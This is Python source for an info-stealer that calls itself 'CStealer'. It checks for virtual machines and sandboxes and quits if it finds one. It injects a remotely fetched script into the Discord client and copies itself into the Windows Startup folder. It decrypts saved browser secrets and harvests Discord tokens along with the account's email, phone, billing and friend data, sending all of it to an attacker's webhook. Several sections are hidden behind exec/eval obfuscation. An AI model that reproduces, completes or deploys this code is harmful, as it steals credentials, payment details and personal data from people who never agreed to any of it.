import os
import requests
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
import ctypes
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import wmi
import re
import sys
import subprocess
import uuid
import socket
import getpass

def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix


def in_virtualenv():
    return get_base_prefix_compat() != sys.prefix
    
class Kerpy:
    def registry_check(self):
        cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\"
        reg1 = subprocess.run(cmd + "DriverDesc", shell=True, stderr=subprocess.DEVNULL)
        reg2 = subprocess.run(cmd + "ProviderName", shell=True, stderr=subprocess.DEVNULL)
        if reg1.returncode == 0 and reg2.returncode == 0:
            print("VMware Registry Detected")
            sys.exit()

    def processes_and_files_check(self):
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            print("VMwareService.exe & VMwareTray.exe process are running")
            sys.exit()
                           
        if os.path.exists(vmware_dll): 
            print("Vmware DLL Detected")
            sys.exit()
            
        if os.path.exists(virtualbox_dll):
            print("VirtualBox DLL Detected")
            sys.exit()
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            sys.exit()
        except:
            pass        
        
        processl = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/process.txt").text
        if processl in processList:
            sys.exit()
            
    def mac_check(self):
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        mac_list = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/mac_list.txt").text
        if mac_address[:8] in mac_list:
            print("VMware MAC Address Detected")
            sys.exit()
    def check_pc(self):
     vmname = os.getlogin()
     vm_name = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/pc_name_list.txt").text
     if vmname in vm_name:
         sys.exit()
     vmusername = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/pc_username_list.txt").text
     host_name = socket.gethostname()
     if host_name in vmusername:
         sys.exit()
    def hwid_vm(self):
     current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
     hwid_vm = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/hwid_list.txt").text
     if current_machine_id in hwid_vm:
         sys.exit()
    def checkgpu(self):
     c = wmi.WMI()
     for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()
     gpulist = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/gpu_list.txt").text
     if GPUm in gpulist:
         sys.exit()
    def check_ip(self):
     ip_list = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/ip_list.txt").text
     reqip = requests.get("https://api.ipify.org/?format=json").json()
     ip = reqip["ip"]
     if ip in ip_list:
         sys.exit()
    def profiles():
     machine_guid = uuid.getnode()
     guid_pc = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/MachineGuid.txt").text
     bios_guid = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/BIOS_Serial_List.txt").text
     baseboard_guid = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/BaseBoard_Serial_List.txt").text
     serial_disk = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/DiskDrive_Serial_List.txt").text
     if machine_guid in guid_pc:
         sys.exit()
     w = wmi.WMI()
     for bios in w.Win32_BIOS():
      bios_check = bios.SerialNumber    
     if bios_check in bios_guid:
         sys.exit() 
     for baseboard in w.Win32_BaseBoard():
         base_check = baseboard.SerialNumber
     if base_check in baseboard_guid:
         sys.exit()
     for disk in w.Win32_DiskDrive():
      disk_serial = disk.SerialNumber
     if disk_serial in serial_disk:
         sys.exit()

h00k = "YOUR_WEBHOOK_URL"
inj3c710n_url = "https://raw.githubusercontent.com/1337cstealer1337/inject/main/index.js"
DETECTED = False


def g371P():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def g37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return g37D474(blob_out)

def D3CrYP7V41U3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04Dr3QU3575(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def L04DUr118(h00k, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(h00k, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(h00k, data=data))
                return r
        except: 
            pass

def g108411NF0():
    ip = g371P()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    g108411NF0 = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    # print(globalinfo)
    return g108411NF0


def TrU57(C00K13s):
    # simple Trust Factor system
    global DETECTED
    data = str(C00K13s)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def inj3c710n():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj3c710n_cont = requests.get(inj3c710n_url).text

                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", h00k)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj3c710n_cont)
inj3c710n()

def G37UHQFr13ND5(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Active_Developer', 'Value': 4194304, 'Emoji': "<:Active_Dev:1045024909690163210> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def G3781111N6(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def G3784D63(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Active_Developer', 'Value': 4194304, 'Emoji': "<:active_developer:1069999874566791189> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def G3770K3N1NF0(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def CH3CK70K3N(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)

__cnk_obfuscator__ = ""
import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='2110745 3013472 8364928 695884 5530764 1583232 10644055 1335856 3809632 1142241 5154635 9994635 457040 10045984 9887670 9714642 3498254 5819121 556887 629148 3900765 290031 4018545 4905588 2288110 3507669 5476570 6244306 4167273 5650582 1619454 1015035 3165111 3416592 3929310 1406475 4835937 8007482 3059898 170720 20620 10072576 7188363 8206880 3925870 908500 894432 4437750 1770432 1872244 3660592 10079472 6001608 8871184 9811800 3247826 1532388 2540491 5104600 2641590 9310285 914067 3266508 28386 9205500 2408928 4988709 5521584 9399724 3722588 9507940 2454928 6631170 1116673 1260210 1180791 3659026 2210728 781440 1340880 9452380 5020785 3075680 630189 1461888 144088 2537315 2473776 4942409 1026272 4924305 1679280 3069456 1640765 2448000 5530280 1605850 2148159 999900 4805800 732750 2505888 2205475 7381260 1893903 3357228 6792255 7272525 451935 4333750 3462815 2786519 4207500 2465915 1591590 4520000 2296056 5565057 3553836 2240250 7103038 7296980 3734305 5708960 4625000 908250 1428172 8753352 3760988 8359767 2903092 2460494 7327845 5570610 997776 5470463 1803537 9275800 3769308 656100 54000 280525 5799890 10554906 1950714 6883310 1890000 1331484 10636464 2109912 3475368 8856090 4102488 6715930 8057984 2639877 6501915 7682754 646695 4961365 2579022 3029856 3222830 741008 5309019 3595509 857168 4335825 3793930 6088851 4318678 292842';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzLPczdAr0MHHMrTBxdPcxisqtyIoKLDACAFvdB50=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

def UP104D70K3N(token, path):
    __cnk_obfuscator__ = ""
    import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='2110745 3013472 8364928 695884 5530764 1583232 10644055 1335856 3809632 1142241 5154635 9994635 457040 10045984 9887670 9714642 3498254 5819121 556887 629148 3900765 290031 4018545 4905588 2288110 3507669 5476570 6244306 4167273 5650582 1619454 1015035 3165111 3416592 3929310 1406475 4835937 8007482 3059898 170720 20620 10072576 7188363 8206880 3925870 908500 894432 4437750 1770432 1872244 3660592 10079472 6001608 8871184 9811800 3247826 1532388 2540491 5104600 2641590 9310285 914067 3266508 28386 9205500 2408928 4988709 5521584 9399724 3722588 9507940 2454928 6631170 1116673 1260210 1180791 3659026 2210728 781440 1340880 9452380 5020785 3075680 630189 1461888 144088 2537315 2473776 4942409 1026272 4924305 1679280 3069456 1640765 2448000 5530280 1605850 2148159 999900 4805800 732750 2505888 2205475 7381260 1893903 3357228 6792255 7272525 451935 4333750 3462815 2786519 4207500 2465915 1591590 4520000 2296056 5565057 3553836 2240250 7103038 7296980 3734305 5708960 4625000 908250 1428172 8753352 3760988 8359767 2903092 2460494 7327845 5570610 997776 5470463 1803537 9275800 3769308 656100 54000 280525 5799890 10554906 1950714 6883310 1890000 1331484 10636464 2109912 3475368 8856090 4102488 6715930 8057984 2639877 6501915 7682754 646695 4961365 2579022 3029856 3222830 741008 5309019 3595509 857168 4335825 3793930 6088851 4318678 292842';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzLPczdAr0MHHMrTBxdPcxisqtyIoKLDACAFvdB50=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = G3781111N6(token)
    badge = G3784D63(flags)
    friends = G37UHQFr13ND5(token)
    if friends == '': friends = "No Rare Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "content": f'{g108411NF0()} | Found in `{path}`',
        "embeds": [
            {
            "color": 2895667,
            "fields": [
                {
                    "name": "<:hackerblack:1069103325200535694> Token:",
                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": "<:mail:1069997090266173500> Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": "<:phone:1069109201978273833> Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": "<a:blackworld:1069097358664667266> IP:",
                    "value": f"`{g371P()}`",
                    "inline": True
                },
                {
                    "name": "<a:blackbadge:1069100354312093798> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": "<a:blackmoneycard:1069097362959630337> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<:blackmember:1069102743672868884> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "You're currently using free version of CStealer | t.me/cstealerr",
                "icon_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif",
        "username": "CStealer",
        "attachments": []
        }
    __cnk_obfuscator__ = ""
    import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='1883245 2563712 3441672 10633256 9467340 1078560 560280 5415054 552908 3286334 2680987 9490950 1570408 1125592 7010289 2830730 1954080 8098101 8235090 1571671 3573974 1170120 461703 1877616 2041325 7260165 960740 6637959 4061379 7533946 5563080 2301922 3379311 2649654 3576760 4229107 315240 6908020 8571876 843070 385480 3251781 1268478 1484784 6654672 5342960 1576206 10853810 2449920 2125522 5617721 6370940 3752541 6422792 8440655 9179080 435600 2854954 11433474 1959210 3675491 6301770 1111308 2016160 8278600 1365566 6974964 5291156 2993209 1348700 1396161 1848749 10618048 2166140 2769400 5934500 7304876 10586392 8856779 3350397 3934472 6277655 5651140 927927 8742138 825600 3083833 826680 223983 1329284 1644128 2860416 3359159 9567692 374000 411474 1475274 10238910 4920382 5807048 3728314 444648 463900 9797909 3297336 2475260 1735202 548047 288050 6846460 2416848 3226340 185436 166685 322506 2404773 4532843 1669640 2136480 7867808 2883648 3048528 8671815 2171576 1068064 937300 2345557 7438500 1114045 1546960 6647400 9477351 3963349 2103584 10610245 2368360 5412900 1493509 117508 7877661 275069 2046632 3517729 5749920 396693 8560653 5533800 2383499 2240360 3773353 3464648 577216 8445216 7680141 5721060 1829300 9540359 988380 3449195 1083421 4475744 5194026 5370114 3415900 6108884 1641144 7093430 2693741';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLcvfJdnT3MHbMjcp2zA3KdgosAeIoAwBgeQfJ';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

    

def R3F0rM47(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def UP104D(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "cscook":
        rb = ' | '.join(da for da in c00K1W0rDs)
        if len(rb) > 1000: 
            rrrrr = R3F0rM47(str(c00K1W0rDs))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": g108411NF0(),
            "embeds": [
                {
                    "title": "CStealer | Cookies Stealer",
